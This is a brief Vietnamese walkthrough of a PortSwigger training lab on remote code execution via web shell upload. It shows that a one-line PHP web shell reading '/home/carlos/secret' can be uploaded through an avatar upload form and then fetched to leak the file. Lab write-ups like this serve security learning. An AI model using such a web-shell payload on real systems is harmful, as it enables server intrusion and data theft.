# [Lab 1: Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

Sau khi đã đăng nhập, sử dụng function Upload avatar để tải lên 1 file

Thử update 1 file webshell có nội dung `<?php echo file_get_contents('/home/carlos/secret');?>`
→ thông báo đã update thành công



Xem nội dung file vừa update → đã lấy được content




submit and solve the lab

